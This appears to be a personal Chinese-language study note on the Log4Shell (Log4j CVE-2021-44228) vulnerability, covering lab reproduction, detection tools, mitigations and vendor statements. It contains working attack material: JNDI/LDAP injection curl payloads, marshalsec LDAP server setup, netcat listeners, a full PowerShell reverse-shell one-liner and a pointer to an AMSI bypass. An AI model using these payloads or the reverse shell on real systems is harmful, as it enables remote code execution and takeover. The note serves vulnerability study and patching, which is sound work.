# log4j

## 信息
https://github.com/NCSC-NL/log4shell

各产品影响
https://github.com/YfryTchsGD/Log4jAttackSurface


## 复现

[CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)](https://www.youtube.com/watch?v=7qoPDq41xhQ)

```bash
https://github.com/leonjza/log4jpwn
git clone git@github.com:leonjza/log4jpwn.git
docker build -t log4jpwn .
docker run --rm -p8080:8080 log4jpwn
  java -jar target/log4jpwn-1.0-SNAPSHOT-jar-with-dependencies.jar
nc -lnvp 8888
curl -v -H 'User-Agent: ${jndi:ldap://172.17.0.1:8888/a}' 'localhost:8080/${jndi:ldap://172.17.0.1:8888/a}/?pwn=$\{jndi:ldap://172.17.0.1:8888/a\}'
```

[marshalsec](https://github.com/mbechler/marshalsec)

```bash
git clone git@github.com:mbechler/marshalsec.git
mvn clean package -DskipTests.

# https://hub.docker.com/_/maven?tab=tags

docker pull maven:3.8.4-openjdk-8

# https://github.com/christophetd/log4shell-vulnerable-app/blob/main/Dockerfile
FROM openjdk:8u181-jdk-alpine

FROM maven:3.8.4-openjdk-8
COPY . /usr/src/myapp
WORKDIR /usr/src/myapp
RUN mvn clean package -DskipTests
RUN mvn clean package -Dmaven.test.skip=true

docker build -t marshalsec .
nc -lnvp 9999
```

[maven跳过单元测试-maven.test.skip和skipTests的区别](https://www.cnblogs.com/javabg/p/8026881.html)

https://github.com/xiajun325/apache-log4j-rce-poc


```bash
git clone git@github.com:xiajun325/apache-log4j-rce-poc.git

docker run -v `pwd`/:/root/poc  marshalsec javac /root/poc/src/main/java/Log4jRCE.java

# https://www.cnblogs.com/mingforyou/p/3551199.html
javac Log4jRCE.java
php -S 127.0.0.1:8888
python -m http.server
http://localhost:8000/

docker cp /usr/src/myapp/target/marshalsec-0.0.3-SNAPSHOT-all.jar ./
java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Log4jRCE"

docker run --rm --name log4jpwn -p8080:8080 log4jpwn


curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/a}' 'localhost:8080/${jndi:ldap://172.29.78.192:1389/a}/?pwn=$\{jndi:ldap://172.29.78.192:1389/a\}'
curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCELinux}' 'localhost:8080'
curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCE}' 'localhost:8080'
172.17.0.2
# vim Log4jRCE.java
Runtion.getRuntime().exec("calc.exe")
python3 -m http.server
```

${jndi:ldap://xxx/Log4jRCE}

反向

[powershell reverse shell one liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

```powershell
# Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

https://raikia.com/tool-powershell-encoder/

GOOGLE: powershell encode raikou base64

https://amsi.fail

再把calc.exe 代替成上面的编码shell

nc -lnvp 9898 
做为执行端

### 在线测试端口

https://log4shell.huntress.com/

docker run 
curl -H

### minecraft

https://papermc.io/

```powershell
@echo off
java -Xms2G -Xms2G -jar paper-1.8.8-443.jar
pause
```

eula.txt
eula=true

https://www.minecraft.net
https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition

### 影响监控

https://www.greynoise.io/
https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22
https://gist.github.com/superducktoes/b642c6f5de4f19a3715675303e0d6357
https://gist.github.com/gnremy/c546c7911d5f876f263309d7161a7217

### docker 靶机

https://github.com/christophetd/log4shell-vulnerable-app
docker build . -t vulnerable-app
docker run -p 8081:8080 --name vulnerable-app vulnerable-app

curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
curl 127.0.0.1:8081 -H 'X-Api-Version: ${jndi:ldap://78769f89.dns.1433.eu.org:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'


jdeps /app/spring-boot-application.jar
jdeps  -summary -recursive /app/spring-boot-application.jar

$ jdeps --class-path 'libs/*' -recursive sh-2.6.3.jar

jar tvf yourjar.jar | perl -nle'BEGIN{$depth=(shift)-1}print join(".", (split(/\//, (split)[-1]))[0..$depth])' 3

https://github.com/huntresslabs/log4shell-tester
https://github.com/Cybereason/Logout4Shell

### LDAP

自用的LDAP测试工具，一键启动
https://github.com/EmYiQing/LDAPKit

https://github.com/WazeHell/sam-the-admin
Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user

### 其它POC

https://github.com/kozmer/log4j-shell-poc


### DNSLOG

[](./sec.dnslog.md)

## 发现

https://github.com/whwlsfb/Log4j2Scan
Log4j2 RCE Passive Scanner plugin for BurpSuite

https://github.com/tangxiaofeng7/BurpLog4j2Scan

https://github.com/Neo23x0/log4shell-detector

https://github.com/hillu/local-log4j-vuln-scanner

## WAF
https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
## 补丁

这个对应的 https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2
是已经升级到 2.15.0 的

运行时的热补丁
https://github.com/corretto/hotpatch-for-apache-log4j2

APACHE LOG4J2 远程代码执行漏洞处置手册
http://blog.nsfocus.net/apache-log4j2/

Apache Solr

Apache Struts2

Apache Flink

Apache Druid

spring-boot-strater-log4j2

## 20211210

Remote code injection in Log4j
https://github.com/advisories/GHSA-jfh8-c2jp-5v3q

【安全通报】Apache Log4j2 远程代码执行漏洞
https://nosec.org/home/detail/4917.html
  Vulfocus 靶场环境
  目前 Vulfocus 已经集成 Log4j2 环境，可通过以下链接启动环境测试：
  http://vulfocus.fofa.so/#/dashboard?image_id=3b8f15eb-7bd9-49b2-a69e-541f89c4216c

  漏洞利用及POC验证
  poc:
  ${jndi:ldap://xxxxx.dnslog.cn/exp}
  ${jndi:rmi://xxxxx.dnslog.cn/exp}
到这里获得一个 地址
http://dnslog.cn/
如：mixazx.dnslog.cn
本地 ping mixazx.dnslog.cn
Refresh Record，发现有记录
找一个有 log4j 日志使用的应用，发送

${jndi:ldap://mixazx.dnslog.cn/exp}
${jndi:rmi://mixazx.dnslog.cn/exp}
做为参数

http://ceye.io/records/dns
https://log.xn--9tr.com/
这个有点慢
http://dnslog.cn/
[DNS 原理入门](https://www.ruanyifeng.com/blog/2016/06/dns.html)


[Apache Log4j远程代码执行漏洞风险通报信息汇总](https://www.freebuf.com/articles/308151.html)

POC：
https://www.lunasec.io/docs/blog/log4j-zero-day/
https://github.com/azhao1981/apache-log4j-poc

【重要通知】关于Apache Log4j 2远程代码执行最新漏洞的风险提示
https://itsc.nju.edu.cn/7a/42/c41947a555586/page.htm
【紧急补救措施】

（1）  修改jvm参数 -Dlog4j2.formatMsgNoLookups=true     
（2）  修改配置log4j2.formatMsgNoLookups=True
（3）  将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true
  TODO: 需要重启吗？还是写在bash里就可以了

## 厂商声明

 Elasticsearch
  Elasticsearch is not susceptible to remote code execution with this vulnerability due to our use of the Java Security Manager. Elasticsearch on JDK8 or below is susceptible to an information leak via DNS which is fixed by a simple JVM property change. The information leak does not permit access to data within the Elasticsearch cluster. We will also release a new version of Elasticsearch that contains the JVM property by default and removes certain components of Log4j out of an abundance of caution. Additional details below.
  由于我们使用Java Security Manager, Elasticsearch不容易受到带有此漏洞的远程代码执行的影响。 
  在JDK8或更低版本上的Elasticsearch容易通过DNS发生信息泄漏，这可以通过简单的JVM属性更改来修复。 
  信息泄漏不允许访问Elasticsearch集群中的数据。 
  我们还将发布一个新版本的Elasticsearch，该版本默认包含JVM属性，为了谨慎起见，它删除了Log4j的某些组件。 